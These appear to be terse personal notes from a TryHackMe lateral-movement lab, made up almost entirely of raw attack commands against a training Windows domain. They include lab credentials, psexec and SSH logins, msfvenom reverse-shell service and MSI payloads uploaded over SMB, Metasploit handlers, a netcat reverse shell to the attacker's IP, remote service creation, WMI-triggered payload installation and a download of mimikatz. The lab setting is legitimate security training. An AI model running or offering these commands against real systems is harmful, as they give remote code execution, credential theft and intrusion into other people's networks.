 systemd-resolve --interface lateralmovement --set-dns 10.200.48.101 --set-domain za.tryhackme.com


 ip add show lateralmovement



nslookup thmdc.za.tryhackme.com



http://distributor.za.tryhackme.com/creds



 Your credentials have been generated: Username: hollie.norris Password: Jxug4101 

 Your credentials have been generated: Username: donna.bishop Password: Please2001 

terence.lloyd Password: Welcome123

xfreerdp /u:hollie.norris /p:Jxug4101 /v:10.200.48.101 /dynamic-resolution




ssh za\\donna.bishop@thmjmp2.za.tryhackme.com     EZpass4ever



ssh za\\terence.lloyd@thmjmp2.za.tryhackme.com     EZpass4ever


ssh t1_leonard.summers@za.tryhackme.com@thmjmp2.za.tryhackme.com    Jxug4101





psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe




Directory of C:\Users                                                          

08/03/2025  01:33 AM    <DIR>          .                                        
08/03/2025  01:33 AM    <DIR>          ..                                       
06/21/2022  04:28 PM    <DIR>          .NET v4.5                                
06/21/2022  04:28 PM    <DIR>          .NET v4.5 Classic                        
06/14/2022  02:59 PM    <DIR>          Administrator                            
06/22/2022  03:00 PM    <DIR>          Administrator.ZA                         
08/02/2025  10:08 AM    <DIR>          barbara.taylor                           
06/15/2022  04:58 AM    <DIR>          darren.davis                             
06/17/2022  03:34 PM    <DIR>          graeme.williams                          
08/02/2025  05:09 PM    <DIR>          henry.bird                               
08/02/2025  09:11 PM    <DIR>          henry.taylor                             
08/03/2025  01:34 AM    <DIR>          hollie.norris                            
08/02/2025  04:22 PM    <DIR>          jasmine.stanley                          
08/02/2025  06:25 PM    <DIR>          jenna.field                              
08/02/2025  06:38 PM    <DIR>          jennifer.wright                          
06/15/2022  04:29 PM    <DIR>          kenneth.davies                           
06/19/2022  05:50 AM    <DIR>          kimberley.smith                          
06/18/2022  03:32 PM    <DIR>          mandy.bryan                              
06/21/2022  04:25 PM    <DIR>          MSSQL$MICROSOFT##WID                     
10/27/2022  04:28 PM    <DIR>          munra                                    
08/02/2025  03:01 PM    <DIR>          natasha.howells                          
08/02/2025  08:47 PM    <DIR>          nathan.perry                             
09/12/2016  11:35 AM    <DIR>          Public                                   
08/02/2025  03:28 AM    <DIR>          rachael.atkinson                         
06/17/2022  03:56 PM    <DIR>          t1_leonard.summers                       
08/02/2025  11:51 PM    <DIR>          t1_toby.beck                             
08/02/2025  11:51 PM    <DIR>          t1_toby.beck1                            
08/02/2025  11:51 PM    <DIR>          t1_toby.beck2                            
08/02/2025  11:51 PM    <DIR>          t1_toby.beck3                            
08/02/2025  11:52 PM    <DIR>          t1_toby.beck4                            
08/02/2025  11:42 PM    <DIR>          t1_toby.beck5                            
06/20/2022  03:24 AM    <DIR>          t2_arthur.campbell                       
08/02/2025  07:07 PM    <DIR>          t2_felicia.dean                          
06/21/2022  01:05 PM    <DIR>          t2_henry.bird                            
06/22/2022  01:39 PM    <DIR>          t2_jasmine.stanley                       
08/02/2025  04:04 PM    <DIR>          t2_kelly.blake                           
06/20/2022  01:30 PM    <DIR>          t2_lewis.holloway                        
06/20/2022  03:50 AM    <DIR>          t2_natasha.howells                       
08/02/2025  01:30 PM    <DIR>          tracey.turner                            
06/14/2022  03:36 PM    <DIR>          vagrant                                  
               0 File(s)              0 bytes                                   
              40 Dir(s)   8,422,273,024 bytes free    



ssh t1_leonard.summers@za.tryhackme.com@thmjmp2.za.tryhackme.com


psexec64.exe \\10.200.48.249 -u Administrator -p Mypass123 -i cmd.exe




msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.46.190 LPORT=4444 -o myservice.exe


smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever





ser@AttackBox$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > exploit




msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"




runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.46.190 4443"



sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto

sc.exe \\thmiis.za.tryhackme.com start THMservice-3249








$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;














msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi


smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994

msfconsole
use exploit/multi/handler
set LHOST lateralmovement
set LPORT 4444
set payload windows/shell/reverse_tcp
exploit




$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop


We then invoke the Install method from the Win32_Product class to trigger the payload:


Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}











└─$ sudo python3 -m http.server -b 10.50.46.14




powershell.exe -ExecutionPolicy Bypass
Invoke-WebRequest 'http://10.50.46.14:8000/mimikatz.zip' -OutFile .\mimikatz.zip
Expand-Archive .\mimikatz.zip